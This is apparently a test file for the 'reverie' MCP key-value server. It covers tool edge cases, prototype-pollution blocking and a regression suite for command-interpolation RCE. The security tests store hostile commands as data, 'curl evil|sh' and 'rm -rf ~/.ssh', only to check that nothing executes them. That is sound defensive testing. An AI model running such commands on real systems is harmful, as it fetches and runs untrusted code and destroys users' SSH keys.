 

/**
 * Advanced MCP server tests covering:
 * - Edge cases in tool inputs
 * - Scope resolution
 * - Error paths
 * - Prototype pollution prevention
 * - Boundary conditions
 */

type ToolHandler = (params: any) => Promise<any>;
// Was vi.hoisted (#112) — bun:test has no equivalent, but doesn't need
// one because vi.mock factories run in source order, after this binding.
const toolHandlers: Record<string, ToolHandler> = {};
const mockExecSync = vi.fn();
const mockFiles: Record<string, boolean> = {};
const mockWrittenFiles: Record<string, string> = {};
const mockData: Record<string, any> = {};
const mockAliases: Record<string, string> = {};
const mockConfig: Record<string, any> = { colors: true, theme: 'default' };
const mockConfirmKeys: Record<string, true> = {};
const mockMetaData: Record<string, number> = {};

vi.mock('@modelcontextprotocol/sdk/server/mcp.js', () => {
  class MockMcpServer {
    tool = vi.fn((name: string, _desc: string, _schema: any, handler?: ToolHandler) => {
      const fn = handler ?? _schema;
      toolHandlers[name] = fn;
    });
    connect = vi.fn().mockResolvedValue(undefined as never);
  }
  return { McpServer: MockMcpServer };
});

vi.mock('@modelcontextprotocol/sdk/server/stdio.js', () => ({
  StdioServerTransport: vi.fn(),
}));

vi.mock('child_process', () => ({
  execSync: (...args: any[]) => mockExecSync(...args),
  spawn: vi.fn(),
  spawnSync: vi.fn(() => ({ status: 0, stdout: '', stderr: '' })),
}));

vi.mock('fs', () => {
  const mock = {
    existsSync: vi.fn((p: string) => mockFiles[p] === true),
    writeFileSync: vi.fn((p: string, content: string) => { mockWrittenFiles[p] = content; }),
    renameSync: vi.fn((src: string, dest: string) => {
      if (mockWrittenFiles[src] !== undefined) {
        mockWrittenFiles[dest] = mockWrittenFiles[src];
        delete mockWrittenFiles[src];
      }
    }),
    statSync: vi.fn(() => ({ mtimeMs: Date.now() })),
    readFileSync: vi.fn(() => JSON.stringify({ entries: {}, aliases: {}, confirm: {} })),
    mkdirSync: vi.fn(),
    openSync: vi.fn(() => 3),
    readSync: vi.fn(() => 0),
    writeSync: vi.fn(),
    closeSync: vi.fn(),
    unlinkSync: vi.fn(),
    appendFile: vi.fn((_p: string, _data: string, _opts: any, cb?: (err: NodeJS.ErrnoException | null) => void) => {
      if (typeof _opts === 'function') _opts(null);
      else if (cb) cb(null);
    }),
    constants: { O_CREAT: 0x40, O_EXCL: 0x80, O_WRONLY: 0x01 },
  };
  return { default: mock, ...mock };
});

// Mock helpers
function getNestedMock(obj: any, path: string): any {
  return path.split('.').reduce((o, k) => (o ? o[k] : undefined), obj);
}
function setNestedMock(obj: any, path: string, value: any): void {
  const parts = path.split('.');
  const lastIndex = parts.length - 1;
  let cur = obj;
  for (let i = 0; i < lastIndex; i++) {
    const key = parts[i];
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') return;
    if (!cur[key] || typeof cur[key] !== 'object') cur[key] = {};
    cur = cur[key];
  }
  const lastKey = parts[lastIndex];
  if (lastKey === '__proto__' || lastKey === 'constructor' || lastKey === 'prototype') return;
  cur[lastKey] = value;
}
function flattenMock(obj: any, prefix = ''): Record<string, string> {
  const result: Record<string, string> = {};
  for (const [k, v] of Object.entries(obj)) {
    const key = prefix ? `${prefix}.${k}` : k;
    if (typeof v === 'object' && v !== null) Object.assign(result, flattenMock(v, key));
    else result[key] = String(v);
  }
  return result;
}
function removeNestedMock(obj: any, path: string): boolean {
  const parts = path.split('.');
  let cur = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    if (!cur[parts[i]]) return false;
    cur = cur[parts[i]];
  }
  if (cur[parts[parts.length - 1]] === undefined) return false;
  delete cur[parts[parts.length - 1]];
  return true;
}

vi.mock('../storage', () => ({
  loadData: vi.fn(() => ({ ...mockData })),
  saveData: vi.fn((d: any) => {
    Object.keys(mockData).forEach(k => delete mockData[k]);
    Object.assign(mockData, d);
  }),
  getValue: vi.fn((key: string) => getNestedMock(mockData, key)),
  setValue: vi.fn((key: string, value: string) => setNestedMock(mockData, key, value)),
  removeValue: vi.fn((key: string) => removeNestedMock(mockData, key)),
  getEntriesFlat: vi.fn(() => flattenMock(mockData)),
  // Round-2 import validators — see mcp-server.test.ts for the same shim.
  validateImportEntries: vi.fn(),
  validateImportAliases: vi.fn(),
  validateImportConfirm: vi.fn(),
}));

vi.mock('../alias', () => ({
  loadAliases: vi.fn(() => ({ ...mockAliases })),
  saveAliases: vi.fn((a: any) => {
    Object.keys(mockAliases).forEach(k => delete mockAliases[k]);
    Object.assign(mockAliases, a);
  }),
  setAlias: vi.fn((alias: string, path: string) => {
    for (const [existing, target] of Object.entries(mockAliases)) {
      if (target === path && existing !== alias) delete mockAliases[existing];
    }
    mockAliases[alias] = path;
  }),
  resolveKey: vi.fn((k: string) => mockAliases[k] ?? k),
  buildKeyToAliasMap: vi.fn(() => ({})),
  removeAlias: vi.fn((alias: string) => {
    if (!(alias in mockAliases)) return false;
    delete mockAliases[alias];
    return true;
  }),
  removeAliasesForKey: vi.fn(),
  renameAlias: vi.fn((oldName: string, newName: string) => {
    if (!(oldName in mockAliases)) return false;
    if (newName in mockAliases) return false;
    mockAliases[newName] = mockAliases[oldName];
    delete mockAliases[oldName];
    return true;
  }),
}));

vi.mock('../confirm', () => ({
  hasConfirm: vi.fn((key: string) => mockConfirmKeys[key] === true),
  setConfirm: vi.fn((key: string) => { mockConfirmKeys[key] = true; }),
  removeConfirm: vi.fn((key: string) => { delete mockConfirmKeys[key]; }),
  loadConfirmKeys: vi.fn(() => ({ ...mockConfirmKeys })),
  saveConfirmKeys: vi.fn((c: any) => {
    Object.keys(mockConfirmKeys).forEach(k => delete mockConfirmKeys[k]);
    Object.assign(mockConfirmKeys, c);
  }),
  removeConfirmForKey: vi.fn(),
}));

vi.mock('../utils/paths', () => ({
  ensureDataDirectoryExists: vi.fn(),
  getAliasFilePath: vi.fn(() => '/mock/aliases.json'),
  getConfigFilePath: vi.fn(() => '/mock/config.json'),
  getConfirmFilePath: vi.fn(() => '/mock/confirm.json'),
  getUnifiedDataFilePath: vi.fn(() => '/mock/data.json'),
  getDataDirectory: vi.fn(() => '/mock'),
  getGlobalStoreDirPath: vi.fn(() => '/mock/store'),
  findProjectFile: vi.fn(() => null),
  findProjectFileWithDiagnostic: vi.fn(() => ({ path: null, diagnostic: { reason: 'no_project', searchedFrom: '/mock' } })),
  findProjectStoreDir: vi.fn(() => null),
  clearProjectFileCache: vi.fn(),
  clearDataDirectoryCache: vi.fn(),
  isDataDirectoryFromEnv: vi.fn(() => false),
  setProjectRootOverride: vi.fn(),
  getProjectRootOverride: vi.fn(() => null),
}));

vi.mock('../store', () => ({
  findProjectFile: vi.fn(() => null),
  // Mirrors the real resolution with this mock's findProjectFile (always
  // null), so auto resolves to global.
  getEffectiveScope: vi.fn((scope?: string) => (scope === 'project' ? 'project' : 'global')),
  clearProjectFileCache: vi.fn(),
  clearStoreCaches: vi.fn(),
  loadEntries: vi.fn(() => ({ ...mockData })),
  saveEntries: vi.fn((d: any) => {
    Object.keys(mockData).forEach(k => delete mockData[k]);
    Object.assign(mockData, d);
  }),
  saveEntriesAndTouchMeta: vi.fn((d: any, key: string) => {
    Object.keys(mockData).forEach(k => delete mockData[k]);
    Object.assign(mockData, d);
    mockMetaData[key] = Date.now();
  }),
  saveEntriesAndRemoveMeta: vi.fn((d: any, key: string) => {
    Object.keys(mockData).forEach(k => delete mockData[k]);
    Object.assign(mockData, d);
    const prefix = key + '.';
    for (const k of Object.keys(mockMetaData)) {
      if (k === key || k.startsWith(prefix)) delete mockMetaData[k];
    }
  }),
  touchMeta: vi.fn(),
  removeMeta: vi.fn(),
  loadMeta: vi.fn(() => ({ ...mockMetaData })),
  loadMetaMerged: vi.fn(() => ({ ...mockMetaData })),
  STALE_DAYS: 30,
  STALE_MS: 30 * 86400000,
  getStalenessTag: vi.fn((key: string, meta: Record<string, number>) => {
    const ts = meta[key];
    if (ts === undefined) return ' [untracked]';
    if (ts < Date.now() - 30 * 86400000) return ` [${Math.floor((Date.now() - ts) / 86400000)}d]`;
    return '';
  }),
  // bun:test (#112): bun checks every named import strictly. Add no-op
  // stubs for store exports the SUT transitively imports but this test
  // doesn't otherwise stub.
  loadAliasMap: vi.fn(() => ({ ...mockAliases })),
  saveAliasMap: vi.fn((d: any) => { Object.keys(mockAliases).forEach(k => delete mockAliases[k]); Object.assign(mockAliases, d); }),
  loadConfirmMap: vi.fn(() => ({ ...mockConfirmKeys })),
  saveConfirmMap: vi.fn((d: any) => { Object.keys(mockConfirmKeys).forEach(k => delete mockConfirmKeys[k]); Object.assign(mockConfirmKeys, d); }),
  loadEntriesMerged: vi.fn(() => ({ ...mockData })),
  loadAliasMapMerged: vi.fn(() => ({ ...mockAliases })),
  loadConfirmMapMerged: vi.fn(() => ({ ...mockConfirmKeys })),
  saveAll: vi.fn(),
  getEntryFast: vi.fn(),
  setEntryFast: vi.fn(() => false),
}));

vi.mock('../formatting', () => {
  // bun:test (#112): include every named export the SUT or its transitive
  // imports use, even ones this test doesn't observe — bun parses imports
  // strictly and errors on missing names.
  const id = (s: string) => s;
  return {
    formatTree: vi.fn(() => 'tree-output'),
    resetColorCache: vi.fn(),
    color: {
      cyan: id, green: id, yellow: id, red: id, blue: id, magenta: id,
      gray: id, white: id, italic: id, bold: id,
      boldColors: { cyan: id, green: id, yellow: id, blue: id, magenta: id },
    },
    colorizePathByLevels: id,
    displayTree: vi.fn(),
    formatKeyValue: id,
    highlightMatch: id,
    showHelp: vi.fn(),
    showExamples: vi.fn(),
  };
});

vi.mock('../config', () => ({
  DEFAULT_BOOTSTRAP_MAX_RESPONSE_BYTES: 38 * 1024,
  loadConfig: vi.fn(() => ({ ...mockConfig })),
  getConfigSetting: vi.fn((key: string) => mockConfig[key] ?? null),
  setConfigSetting: vi.fn((key: string, value: any) => { mockConfig[key] = value; }),
  VALID_CONFIG_KEYS: ['colors', 'theme'],
  VALID_THEMES: ['default', 'dark', 'light'],
}));

vi.mock('../utils/telemetry', () => ({
  logToolCall: vi.fn(() => Promise.resolve()),
  computeStats: vi.fn(() => ({
    period: '30d', totalCalls: 0, mcpSessions: 0, mcpCalls: 0, cliCalls: 0,
    bootstrapRate: 0, writeBackRate: 0, reads: 0, writes: 0, execs: 0,
    readWriteRatio: '0:0', namespaceCoverage: {}, topTools: [], scopeBreakdown: { project: 0, global: 0, unscoped: 0 },
    estimatedTokensSaved: 0, estimatedTokensSavedBootstrap: 0,
    estimatedExplorationTokensSaved: 0, estimatedRedundantWriteTokensSaved: 0, estimatedTotalTokensSaved: 0, explorationBreakdown: {},
    deliveryCostTokens: 0, netTokensSaved: 0, calibration: {},
  })),
  classifyOp: vi.fn(() => 'meta'),
  getTelemetryPath: vi.fn(() => '/mock/telemetry.jsonl'),
  getMissPathsPath: vi.fn(() => '/mock/miss-paths.jsonl'),
  MissWindowTracker: class { onToolCall() { return []; } flushAll() { return []; } readonly openCount = 0; },
  appendMissPath: vi.fn(() => Promise.resolve()),
  getSessionId: vi.fn(() => 'mock-session'),
  extractNamespace: vi.fn((key?: string) => key ? key.split('.')[0] : '*'),
}));

vi.mock('../utils/audit', () => ({
  logAudit: vi.fn(() => Promise.resolve()),
  queryAuditLog: vi.fn(() => []),
  sanitizeValue: vi.fn((v: string | undefined) => v),
  sanitizeParams: vi.fn((p: Record<string, unknown>) => p),
  classifyOp: vi.fn(() => 'meta'),
  getAuditPath: vi.fn(() => '/mock/audit.jsonl'),
}));

vi.mock('../utils/deepMerge', () => ({
  deepMerge: vi.fn((target: Record<string, any>, source: Record<string, any>) => ({ ...target, ...source })),
}));

function resetMocks() {
  Object.keys(mockData).forEach(k => delete mockData[k]);
  Object.keys(mockAliases).forEach(k => delete mockAliases[k]);
  Object.keys(mockConfirmKeys).forEach(k => delete mockConfirmKeys[k]);
  Object.keys(mockConfig).forEach(k => delete mockConfig[k]);
  Object.assign(mockConfig, { colors: true, theme: 'default' });
  Object.keys(mockFiles).forEach(k => delete mockFiles[k]);
  Object.keys(mockWrittenFiles).forEach(k => delete mockWrittenFiles[k]);
  Object.keys(mockMetaData).forEach(k => delete mockMetaData[k]);
  mockExecSync.mockReset();
}

beforeAll(async () => {
  await import('../mcp-server');
});

describe('MCP Server - Advanced Tests', () => {
  beforeEach(() => {
    resetMocks();
  });

  // ── Prototype pollution prevention ──────────────────────────────────

  describe('prototype pollution prevention', () => {
    it('reverie_set blocks __proto__ key', async () => {
      await toolHandlers['reverie_set']({ key: '__proto__.polluted', value: 'yes' });
      expect(({} as any).polluted).toBeUndefined();
    });

    it('reverie_set blocks constructor key', async () => {
      await toolHandlers['reverie_set']({ key: 'constructor.prototype', value: 'bad' });
      expect(Object.constructor.prototype).not.toBe('bad');
    });
  });

  // ── Edge cases for reverie_get ────────────────────────────────────────

  describe('reverie_get edge cases', () => {
    it('returns depth-limited subtree with depth:1', async () => {
      mockData.server = { prod: { ip: '1.1.1.1' }, dev: { ip: '2.2.2.2' } };
      const result = await toolHandlers['reverie_get']({ key: 'server', depth: 1 });
      const text = result.content[0].text;
      expect(text).toContain('server');
    });

    it('returns all entries when no key provided', async () => {
      mockData.foo = 'bar';
      mockData.baz = 'qux';
      const result = await toolHandlers['reverie_get']({});
      const text = result.content[0].text;
      expect(text).toContain('foo');
      expect(text).toContain('baz');
    });

    it('handles empty data store', async () => {
      const result = await toolHandlers['reverie_get']({});
      const text = result.content[0].text;
      expect(text.toLowerCase()).toContain('no entries');
    });

    it('handles nonexistent key', async () => {
      const result = await toolHandlers['reverie_get']({ key: 'does.not.exist' });
      expect(result.isError).toBe(true);
    });
  });

  // ── reverie_set edge cases ────────────────────────────────────────────

  describe('reverie_set edge cases', () => {
    it('handles very long values', async () => {
      const longValue = 'x'.repeat(10000);
      const result = await toolHandlers['reverie_set']({ key: 'big.value', value: longValue });
      expect(result.content[0].text).toContain('Set:');
    });

    it('handles unicode keys and values', async () => {
      const result = await toolHandlers['reverie_set']({ key: 'project.name', value: 'Hello World' });
      expect(result.content[0].text).toContain('Set:');
    });

    it('handles key with many dot segments', async () => {
      const result = await toolHandlers['reverie_set']({ key: 'a.b.c.d.e.f.g', value: 'deep' });
      expect(result.content[0].text).toContain('Set:');
    });
  });

  // ── reverie_find edge cases ─────────────────────────────────────────

  describe('reverie_find edge cases', () => {
    it('returns empty results for unmatched search', async () => {
      mockData.foo = 'bar';
      const result = await toolHandlers['reverie_find']({ query: 'zzzzzzz' });
      const text = result.content[0].text;
      expect(text).toContain('No results');
    });

    it('searches across keys and values', async () => {
      mockData.server = { ip: '192.168.1.100' };
      const result = await toolHandlers['reverie_find']({ query: '192.168' });
      const text = result.content[0].text;
      expect(text).toContain('192.168');
    });

    it('handles regex search', async () => {
      mockData.server = { port: '8080' };
      mockData.app = { port: '3000' };
      const result = await toolHandlers['reverie_find']({ query: '^\\d{4}$', regex: true });
      const text = result.content[0].text;
      expect(text).toContain('port');
    });
  });

  // ── reverie_remove edge cases ─────────────────────────────────────────

  describe('reverie_remove edge cases', () => {
    it('returns error when removing nonexistent key', async () => {
      const result = await toolHandlers['reverie_remove']({ key: 'does.not.exist' });
      expect(result.isError).toBe(true);
    });

    it('removes a subtree', async () => {
      mockData.server = { prod: { ip: '1' }, dev: { ip: '2' } };
      const result = await toolHandlers['reverie_remove']({ key: 'server' });
      expect(result.content[0].text).toContain('Removed');
    });
  });

  // ── reverie_rename edge cases ─────────────────────────────────────────

  describe('reverie_rename edge cases', () => {
    it('returns error when source key does not exist', async () => {
      const result = await toolHandlers['reverie_rename']({ from: 'missing', to: 'new' });
      expect(result.isError).toBe(true);
    });

    it('returns error when target key already exists', async () => {
      mockData.a = '1';
      mockData.b = '2';
      const result = await toolHandlers['reverie_rename']({ from: 'a', to: 'b' });
      expect(result.isError).toBe(true);
    });
  });

  // ── reverie_copy edge cases ───────────────────────────────────────────

  describe('reverie_copy edge cases', () => {
    it('copies a value to a new key', async () => {
      mockData.source = 'value';
      const result = await toolHandlers['reverie_copy']({ source: 'source', dest: 'dest' });
      expect(result.content[0].text).toContain('Copied');
    });

    it('returns error when source does not exist', async () => {
      const result = await toolHandlers['reverie_copy']({ source: 'missing', dest: 'dest' });
      expect(result.isError).toBe(true);
    });
  });

  // ── reverie_alias edge cases ──────────────────────────────────────────

  describe('reverie_alias edge cases', () => {
    it('reverie_alias_set creates alias and returns success', async () => {
      const result = await toolHandlers['reverie_alias_set']({ alias: 'srv', key: 'server.ip' });
      expect(result.content[0].text).toContain('srv');
    });

    it('reverie_alias_remove returns error for nonexistent alias', async () => {
      const result = await toolHandlers['reverie_alias_remove']({ alias: 'nonexistent' });
      expect(result.isError).toBe(true);
    });

    it('reverie_alias_list with no aliases returns empty message', async () => {
      const result = await toolHandlers['reverie_alias_list']({});
      const text = result.content[0].text;
      expect(text.toLowerCase()).toContain('no aliases');
    });

    it('reverie_alias_list shows all aliases', async () => {
      mockAliases.srv = 'server.ip';
      mockAliases.db = 'database.url';
      const result = await toolHandlers['reverie_alias_list']({});
      const text = result.content[0].text;
      expect(text).toContain('srv');
      expect(text).toContain('db');
    });
  });

  // ── reverie_run edge cases ────────────────────────────────────────────

  describe('reverie_run edge cases', () => {
    it('returns error when key is not found', async () => {
      const result = await toolHandlers['reverie_run']({ key: 'missing.cmd' });
      expect(result.isError).toBe(true);
    });

    it('returns error when value is a subtree', async () => {
      mockData.commands = { build: 'npm build', test: 'npm test' };
      const result = await toolHandlers['reverie_run']({ key: 'commands' });
      expect(result.isError).toBe(true);
    });

    it('executes command and returns stdout', async () => {
      mockData.commands = { build: 'npm run build' };
      mockExecSync.mockReturnValue('Build succeeded\n');
      const result = await toolHandlers['reverie_run']({ key: 'commands.build' });
      expect(result.content[0].text).toContain('Build succeeded');
    });

    it('returns confirm token for --confirm keys', async () => {
      mockData.commands = { deploy: 'deploy.sh' };
      mockConfirmKeys['commands.deploy'] = true;
      const result = await toolHandlers['reverie_run']({ key: 'commands.deploy' });
      // Should return a confirmation prompt, not execute
      const text = result.content[0].text;
      expect(text.toLowerCase()).toMatch(/confirm|token/);
    });

    it('dry run returns command without executing', async () => {
      mockData.commands = { build: 'npm run build' };
      const result = await toolHandlers['reverie_run']({ key: 'commands.build', dry: true });
      const text = result.content[0].text;
      expect(text).toContain('npm run build');
      expect(mockExecSync).not.toHaveBeenCalled();
    });
  });

  // ── SECURITY: $(key) exec must not fire on read / dry / pre-confirm ───
  // Regression for the read=RCE class (interpolation executed stored commands
  // as a side effect of value substitution, on paths that never execute).
  describe('exec-ref safety (read = RCE, fixed)', () => {
    it('reverie_get does NOT execute a $(key) embedded in a read value', async () => {
      mockData.pwn = 'curl evil|sh';
      mockData.notes = { summary: 'status: $(pwn)' };
      const result = await toolHandlers['reverie_get']({ key: 'notes.summary' });
      expect(mockExecSync).not.toHaveBeenCalled();
      expect(result.content[0].text).toContain('$(pwn)');
    });

    it('reverie_get subtree with values:true does NOT execute $(key) leaves', async () => {
      mockData.pwn = 'curl evil|sh';
      mockData.notes = { a: '$(pwn)', b: '$(pwn)' };
      await toolHandlers['reverie_get']({ key: 'notes', values: true });
      expect(mockExecSync).not.toHaveBeenCalled();
    });

    it('reverie_run dry:true does NOT execute an embedded $(key) preview', async () => {
      mockData.payload = 'rm -rf ~/.ssh';
      mockData.deploy = 'echo done $(payload)';
      const result = await toolHandlers['reverie_run']({ key: 'deploy', dry: true });
      expect(mockExecSync).not.toHaveBeenCalled();
      // preview shows the literal exec ref, not its (executed) output
      expect(result.content[0].text).toContain('$(payload)');
    });

    it('reverie_run on a confirm-flagged entry does NOT execute an embedded $(key) before confirmation', async () => {
      mockData.steal = 'curl evil|sh';
      mockData.deploy = 'echo $(steal)';
      mockConfirmKeys['deploy'] = true;
      const result = await toolHandlers['reverie_run']({ key: 'deploy' });
      expect(result.content[0].text.toLowerCase()).toMatch(/confirm|token/);
      expect(mockExecSync).not.toHaveBeenCalled();
    });
  });

  // ── reverie_config edge cases ─────────────────────────────────────────

  describe('reverie_config edge cases', () => {
    it('reverie_config_get returns all config when no key specified', async () => {
      const result = await toolHandlers['reverie_config_get']({});
      const text = result.content[0].text;
      expect(text).toContain('colors');
    });

    it('reverie_config_set rejects invalid config key', async () => {
      const result = await toolHandlers['reverie_config_set']({ key: 'invalid_key', value: 'val' });
      expect(result.isError).toBe(true);
    });

    it('reverie_config_get with specific key returns value', async () => {
      const result = await toolHandlers['reverie_config_get']({ key: 'colors' });
      const text = result.content[0].text;
      expect(text).toContain('true');
    });
  });

  // ── reverie_context edge cases ────────────────────────────────────────

  describe('reverie_context edge cases', () => {
    it('returns message when no data stored', async () => {
      const result = await toolHandlers['reverie_context']({});
      const text = result.content[0].text;
      expect(text.toLowerCase()).toContain('no entries');
    });

    it('returns formatted context with entries', async () => {
      mockData.project = { name: 'test' };
      const result = await toolHandlers['reverie_context']({});
      const text = result.content[0].text;
      expect(text).toContain('project.name');
      expect(text).toContain('test');
    });

    it('supports tier parameter', async () => {
      mockData.project = { name: 'test' };
      mockData.arch = { pattern: 'MVC' };
      const result = await toolHandlers['reverie_context']({ tier: 'essential' });
      // essential tier only includes project.* commands.* conventions.*
      const text = result.content[0].text;
      expect(text).toContain('project');
    });
  });

  // ── reverie_import/export edge cases ──────────────────────────────────

  describe('reverie_import edge cases', () => {
    it('imports entries from JSON data', async () => {
      const result = await toolHandlers['reverie_import']({
        type: 'entries',
        data: JSON.stringify({ project: { name: 'imported' } }),
      });
      expect(result.content[0].text.toLowerCase()).toMatch(/import|merge/);
    });

    it('returns error for invalid JSON', async () => {
      const result = await toolHandlers['reverie_import']({
        type: 'entries',
        data: 'not json!!!',
      });
      expect(result.isError).toBe(true);
    });

    it('returns error for array JSON', async () => {
      const result = await toolHandlers['reverie_import']({
        type: 'entries',
        data: '[1,2,3]',
      });
      expect(result.isError).toBe(true);
    });
  });

  describe('reverie_export edge cases', () => {
    it('exports entries as JSON', async () => {
      mockData.foo = 'bar';
      const result = await toolHandlers['reverie_export']({ type: 'entries' });
      const text = result.content[0].text;
      // Should contain JSON
      expect(() => JSON.parse(text)).not.toThrow();
    });

    it('exports empty data', async () => {
      const result = await toolHandlers['reverie_export']({ type: 'entries' });
      const text = result.content[0].text;
      expect(() => JSON.parse(text)).not.toThrow();
    });
  });

  // ── reverie_reset edge cases ──────────────────────────────────────────

  describe('reverie_reset edge cases', () => {
    it('resets entries to empty', async () => {
      mockData.foo = 'bar';
      const result = await toolHandlers['reverie_reset']({ type: 'entries' });
      expect(result.content[0].text.toLowerCase()).toContain('reset');
    });

    it('resets all data sections', async () => {
      mockData.foo = 'bar';
      mockAliases.a = 'b';
      mockConfirmKeys.x = true;
      const result = await toolHandlers['reverie_reset']({ type: 'all' });
      expect(result.content[0].text.toLowerCase()).toContain('reset');
    });

    it('clears audit log', async () => {
      mockFiles['/mock/audit.jsonl'] = true;
      const result = await toolHandlers['reverie_reset']({ type: 'audit' });
      expect(result.content[0].text.toLowerCase()).toContain('cleared');
    });

    it('clears telemetry log', async () => {
      mockFiles['/mock/telemetry.jsonl'] = true;
      const result = await toolHandlers['reverie_reset']({ type: 'telemetry' });
      expect(result.content[0].text.toLowerCase()).toContain('cleared');
    });
  });

  // ── reverie_stale ─────────────────────────────────────────────────────

  describe('reverie_stale edge cases', () => {
    it('reports no stale entries when all are fresh', async () => {
      mockData.foo = 'bar';
      mockMetaData.foo = Date.now();
      const result = await toolHandlers['reverie_stale']({});
      const text = result.content[0].text;
      expect(text.toLowerCase()).toMatch(/no.*older|no stale|all.*fresh|0 stale/);
    });
  });
});
